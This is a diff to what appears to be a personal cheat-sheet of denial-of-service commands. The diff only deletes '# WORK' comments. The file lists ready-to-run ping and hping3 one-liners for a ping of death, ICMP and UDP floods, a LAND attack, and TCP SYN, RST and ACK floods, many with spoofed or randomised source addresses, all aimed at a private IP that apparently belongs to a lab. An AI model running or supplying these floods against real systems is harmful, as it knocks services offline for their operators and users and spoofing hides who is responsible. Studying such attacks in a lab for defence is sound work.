@@ -1,13 +1,11 @@
 # Ping of death
 sudo ping -f -s 65500 10.1.5.2
 
-# WORK
 # Ping flood with hping3
 sudo apt install hping3 -y
 sudo hping3 -1 --flood -a spoofedIP 10.1.5.2 
 sudo hping3 -1 --flood --rand-source 10.1.5.2 
 
-# WORK
 # Ping flood not fragmented with hping3
 sudo hping3 -1 -y --flood -a spoofedIP 10.1.5.2 
 sudo hping3 -1 -y --flood --rand-source 10.1.5.2 
@@ -18,7 +16,6 @@ sudo hping3 -2 --flood --rand-source 10.1.5.2
 # LAND attack
 sudo hping3 -S --flood --baseport 80 --keep --destport 80 10.1.5.2 -a 10.1.5.2
 
-# WORK
 # TCP SYN flood
 sudo hping3 -S --flood --destport 80 -a spoofedIP 10.1.5.2
 # Drop packet on the spoofedIP
@@ -28,7 +25,6 @@ sudo hping3 -S --flood --destport 80 --rand-source 10.1.5.2
 # TCP RST flood
 sudo hping3 -R --flood --destport 80 --rand-source 10.1.5.2
 
-# WORK
 # TCP ACK flood
 sudo hping3 -A --flood --destport 80 -a spoofedIP 10.1.5.2
 sudo hping3 -A --flood --destport 80 --rand-source 10.1.5.2
